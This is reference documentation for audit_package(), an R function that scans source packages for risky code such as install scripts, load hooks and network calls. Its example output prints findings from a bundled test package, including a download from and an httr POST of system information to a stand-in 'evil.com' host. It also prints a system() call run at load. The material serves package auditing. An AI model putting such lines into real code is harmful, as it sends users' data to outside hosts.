# Audit an R source package

Finds security-relevant file and code contexts, code patterns, and shell
and make matches for review before an R source package is trusted.

## Usage

``` r
audit_package(path = ".", rules = load_rules(), .origin = NULL)
```

## Arguments

- path:

  Path to an R source package root directory. Defaults to the current
  directory.

- rules:

  Named list of rules. Defaults to the rules bundled with the package as
  returned by
  [`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md).

- .origin:

  Internal. Used by
  [`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
  to record tarball provenance. Leave `NULL` for a directory scan.
  Otherwise a list of `path` and `sha256`, each a length-one character,
  and `is_tarball`, a length-one logical that is not `NA`; these become
  the scan's provenance, so a malformed one is refused before the scan
  rather than silently recorded.

## Value

A
[`new_pkgaudit()`](https://tylerjssmith.github.io/pkgaudit/reference/new_pkgaudit.md)
object: a named list with class `pkgaudit` containing five data frames
and a `metadata` list.

- file_contexts:

  `rule`, `file_context`, `message`, and the phase columns.

- patterns:

  `rule`, `file_context`, `line_number`, `column_number`,
  `code_context`, `guarded`, `indirect`, `preview`, `message`, `attck`,
  and the phase columns, in that order: the leading columns are the ones
  a reader skims, and `message` and `attck` restate the rule rather than
  the occurrence. `guarded` and `indirect` say how the code is reached
  rather than what it is, and are described under Details.
  `code_context` is where the code sits *within its file*: `top_level`,
  `in_function`, the lifecycle hook enclosing it, or the part of a help
  file it came from. Where the *file* sits is `file_context`, and a
  finding's phases come from the two together. Join to the other tables
  on `file_context`.

- matches:

  `rule`, `file_context`, `line_number`, `column_number`, `preview`,
  `message`, `attck`, and the phase columns, ordered as `patterns` is,
  less the `code_context` a match has no parse tree to sit in. Regular
  matches matched in the shell scripts and Make-like files among the
  file contexts. Join to the other tables on `file_context`.

- coverage:

  `file_context`, `language`, `status`, `reason`, `first_line`,
  `last_line`, `lines`, `bytes`, `rule`, and the phase columns. One row
  for every file in the package – not only the ones scanned – saying how
  well pkgaudit read it and why not better. See Details.

- errors:

  `step`, `file_context`, `rule`, `message`.

- metadata:

  List of `pkg_name`, `pkg_version`, `pkg_path`, `pkg_is_tarball`,
  `pkg_sha256`, `pkgaudit_version`, `pkgaudit_rules_version`,
  `pkgaudit_rules_sha256`, and `scanned`. The two rules fields describe
  the database `rules` was read from, and are `NA` for a rules list that
  did not come from
  [`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md).

The phase columns are the nine described under Details.

## Details

Every file the scan looks at is found by a file-context rule, and that
rule's `type` decides how the file is read: an `R` script is parsed as
it stands, an `Rd` help file has its `\examples{}` and `\Sexpr{}` code
extracted first, and a `shell` or `make` file is matched line by line
against the match rules. Reading a file yields one or more *segments* of
code, which are what the finders actually see; a help file yields two,
because its examples and its `\Sexpr` macros run at different phases.

A rule's `report` field separates being scanned from being reported.
Every rule tells the scan which files to read; only a reporting rule
adds a row to `file_contexts`. `report` is `TRUE` where a file runs
automatically *and* is matched as text rather than parsed – the shell
and Make-like files, whose contents pkgaudit cannot report on precisely,
so the file itself is the finding. `src/install.libs.R` reports too: it
is parsed, but its presence alone replaces R's default handling of
compiled artifacts. Everything else is scanned just as thoroughly; only
the row asserting the file exists is withheld.

A file context is claimed by extension, so a language pkgaudit cannot
read is left unscanned rather than scanned badly – the Perl, Python and
batch scripts under `exec/`, for instance. Nothing is reported for an
unclaimed file, so its absence from the findings is not evidence that it
is clean.

The `coverage` frame accounts for the code in a package, so that a clean
scan can be checked rather than taken on trust. Each row's `status` is
one of `parsed` (read as R), `matched` (scanned as text), `exportable`
(a language pkgaudit does not read, which
[`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
can hand to a tool that does), `unexamined` (never read), or `error`
(read attempted and refused – too large, unreadable, or would not
parse). `reason` says what stood in the way. `unexamined` and `error`
are different claims: pkgaudit never tried to read the first and could
not read the second. Every `error` row has a matching row in `errors`,
and only a failure at a reading step counts: a rule that fails on a file
says nothing about the file.

The frame accounts for a file when a rule claimed it, or when its name
says what kind of file it is – an `.R` under `misc/`, an `.rds` under
`inst/extdata/` – wherever it sits. A name that says nothing, such as
`NAMESPACE` or `MD5`, is left out, since a frame that lists everything
is harder to read than one that lists the code. That allowlist is
derived from the rules rather than written down, so a rule for a new
kind of file starts accounting for it everywhere.

Coverage therefore never reaches 100%, and is not meant to. What the
frame offers is not completeness but legibility: what was not examined,
and whether it runs. Deserializing an `.rda` can execute arbitrary code,
so serialized objects are reported as executable surface rather than as
data. Phases come from where a file sits rather than from what it is
named, so a file in a directory no rule anticipates is still reported,
with no phases. Version-control and IDE state (`.git/`, `.Rproj.user/`,
`renv/library/`) is outside the package and excluded; `.Rbuildignore` is
not consulted, since it is written by the package under audit.

Recoverable failures in the orchestrated finders are collected in the
`errors` data frame rather than aborting the audit. File paths in every
returned data frame are relative to the package root.

`patterns` and `matches` each carry a `preview`: a display-only excerpt
of the line at `line_number`, whitespace collapsed, so the frames can be
skimmed without opening the files. A trailing `...` means there is more
to see. A long line is windowed on the match rather than cut off at its
start, so `column_number` does not index into the preview. A preview
from a help file comes from the extracted code, not the `.Rd` text.

Each findings data frame also carries one logical column per package
lifecycle phase – `at_autoconf`, `at_build`, `at_check`,
`at_install_src`, `at_install_bin`, `at_load`, `at_attach`, `at_unload`,
and `at_detach` – which is `TRUE` when that finding's code runs during
the phase, so findings can be filtered by when they execute. A file
context takes its phases from the rule that matched, and a match
inherits them from the file context it was found in.

A pattern's phases come from where its file sits and where the code sits
within it, resolved in that order: a lifecycle hook or a part of a help
file carries phases of its own; otherwise the code inherits the phases
of the file context around it, so the same call reports `at_check` under
`tests/` and `at_build` under `data/`.

Code inside a function definition inherits too, with one exception: the
rules for `R/` report it as running at no phase. Both readings are
measured – a function called from top level runs whenever that top-level
code does, and one nothing calls runs nowhere – and `R/` reports the
second because it is dominated by exported functions the lifecycle never
calls. Elsewhere the first is reported, since a helper in a test file is
there to be called. Neither is a claim about *this* package's call
graph, which pkgaudit does not trace.

A finding can belong to several phases, so the phase columns do not
partition the rows.

Code from a help file is attributed to one of two computed contexts:
`Rd_examples`, which `R CMD check` runs, and `Rd_Sexpr`, which is
evaluated whenever the page is rendered – during `R CMD build`,
installation from source, and `R CMD check`, but not on installation
from a binary package.

`patterns` carries two logical columns describing how its code is
reached rather than what the code is. `guarded` is `TRUE` for code that
ships but the lifecycle does not run – a `\dontrun{}` or `\donttest{}`
block, or a vignette chunk marked `eval=FALSE`. Its phases still come
from its context, so they stay an upper bound. `indirect` is `TRUE`
where the call was made through the function's name rather than the
function, as in `do.call("system", ...)`; such a finding is reported
under the rule that owns the name, so filtering on `rule` returns every
call to it however it was spelled. See
[`find_indirect()`](https://tylerjssmith.github.io/pkgaudit/reference/find_indirect.md).

Patterns are matched against R's parse tree, matches against the text of
a shell script or Make-like file. Text matching has no syntax behind it,
so a match reported inside a comment or a quoted string cannot be told
apart from one in a live command; see
[`find_matches()`](https://tylerjssmith.github.io/pkgaudit/reference/find_matches.md).

When called by
[`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md),
`.origin` is a list with `path`, `sha256`, and `is_tarball`, which are
used for the `metadata` list. When calling `audit_package()` on a
package directory directly, leave `NULL`, in which case the directory is
hashed with
[`hash_manifest()`](https://tylerjssmith.github.io/pkgaudit/reference/hash_manifest.md).

## Examples

``` r
# untrustedpkg is a small package shipped with pkgaudit to be scanned.
tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)
exdir <- file.path(tempdir(), "untrustedpkg-example")
utils::untar(tarball, exdir = exdir)

rules  <- load_rules()
result <- audit_package(file.path(exdir, "untrustedpkg"), rules = rules)
result$file_contexts
#>        rule file_context
#> 3 configure    configure
#>                                                                                                                                                                                                                                                  message
#> 3 configure is a shell script used for system-dependent configuration when packages are installed from source, including the installs performed by R CMD check and by R CMD build when a package has vignettes. It can execute arbitrary shell commands.
#>   at_autoconf at_build at_check at_install_src at_install_bin at_load at_attach
#> 3       FALSE     TRUE     TRUE           TRUE          FALSE   FALSE     FALSE
#>   at_unload at_detach
#> 3     FALSE     FALSE
result$patterns
#>            rule      file_context line_number column_number     code_context
#> 1 download_file         R/fetch.R           2             3      in_function
#> 2        system           R/zzz.R           2             3      onLoad_base
#> 3 download_file man/fetch_data.Rd          11             1      Rd_examples
#> 4          httr man/fetch_data.Rd           6            30 Rd_Sexpr_install
#>   guarded indirect
#> 1   FALSE    FALSE
#> 2   FALSE    FALSE
#> 3   FALSE    FALSE
#> 4   FALSE    FALSE
#>                                                                       preview
#> 1                                              download.file(url, tempfile())
#> 2                                                          system("uname -a")
#> 3                  download.file("https://www.evil.com/data.csv", tempfile())
#> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
#>                                                                                                                                                                message
#> 1 download.file() and url() retrieve or open a connection to a remote resource. This can stage a payload for execution via source() or system() in a two-stage attack.
#> 2                                                                              system(), system2(), shell() (on Windows), and pipe() execute arbitrary shell commands.
#> 3 download.file() and url() retrieve or open a connection to a remote resource. This can stage a payload for execution via source() or system() in a two-stage attack.
#> 4                            An httr HTTP call sends an outbound request. A request may be used to exfiltrate credentials or other data, or to fetch a remote payload.
#>                 attck at_autoconf at_build at_check at_install_src
#> 1               T1105       FALSE    FALSE    FALSE          FALSE
#> 2 T1059.003 T1059.004       FALSE     TRUE     TRUE           TRUE
#> 3               T1105       FALSE    FALSE     TRUE          FALSE
#> 4               T1041       FALSE     TRUE     TRUE           TRUE
#>   at_install_bin at_load at_attach at_unload at_detach
#> 1          FALSE   FALSE     FALSE     FALSE     FALSE
#> 2          FALSE    TRUE     FALSE     FALSE     FALSE
#> 3          FALSE   FALSE     FALSE     FALSE     FALSE
#> 4          FALSE   FALSE     FALSE     FALSE     FALSE
print(result)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> Path:      /tmp/RtmpM7JLm0/untrustedpkg-example/untrustedpkg
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-14 12:15 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```
